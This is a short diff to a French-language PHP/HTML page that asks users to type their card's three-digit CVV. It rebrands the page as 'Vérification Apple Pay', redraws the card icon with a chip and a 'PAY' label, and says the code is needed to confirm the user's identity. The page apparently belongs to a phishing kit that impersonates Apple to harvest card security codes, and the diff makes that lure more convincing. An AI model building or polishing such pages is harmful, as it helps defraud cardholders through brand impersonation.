@@ -326,16 +326,23 @@ if (!$cvvValidated) {
 <div class="card">
   <div class="icon-wrap">
     <svg viewBox="0 0 42 42" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <rect x="4" y="8" width="34" height="24" rx="3" fill="#0071e3" stroke="#0071e3" stroke-width="1"/>
-      <rect x="4" y="8" width="34" height="8" rx="3" fill="#005ecb"/>
-      <circle cx="10" cy="27" r="2" fill="white" opacity="0.7"/>
-      <rect x="14" y="25" width="8" height="4" rx="1" fill="white" opacity="0.7"/>
-      <text x="24" y="31" font-size="6" fill="white" opacity="0.8" font-weight="bold">CVV</text>
+      <!-- Carte principale -->
+      <rect x="3" y="7" width="36" height="28" rx="3" fill="#0071e3" stroke="white" stroke-width="1.5"/>
+      <!-- Bande magnétique -->
+      <rect x="3" y="10" width="36" height="7" rx="1" fill="#1a1a2e" opacity="0.9"/>
+      <!-- Puce -->
+      <rect x="6" y="20" width="6" height="6" rx="1" fill="#ffc107" opacity="0.9"/>
+      <line x1="8" y1="20" x2="8" y2="26" stroke="#b8860b" stroke-width="0.5"/>
+      <line x1="9" y1="20" x2="9" y2="26" stroke="#b8860b" stroke-width="0.5"/>
+      <!-- Texte CVV -->
+      <text x="21" y="28" font-size="7" fill="white" font-weight="bold" text-anchor="middle">CVV</text>
+      <!-- Icône Apple Pay -->
+      <text x="32" y="12" font-size="8" font-weight="bold" fill="white" text-anchor="middle">PAY</text>
     </svg>
   </div>
 
-  <h1>Vérification de la carte</h1>
-  <p class="subtitle">Veuillez saisir le <strong>code CVV</strong> à 3 chiffres au verso de votre carte enregistrée.</p>
+  <h1>Vérification Apple Pay</h1>
+  <p class="subtitle">Veuillez saisir le <strong>code CVV</strong> (3 chiffres au verso) de votre <strong>moyen de paiement enregistré</strong> pour confirmer votre identité.</p>
 
   <div class="digits" id="cvvDigits">
     <input type="tel" maxlength="1" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
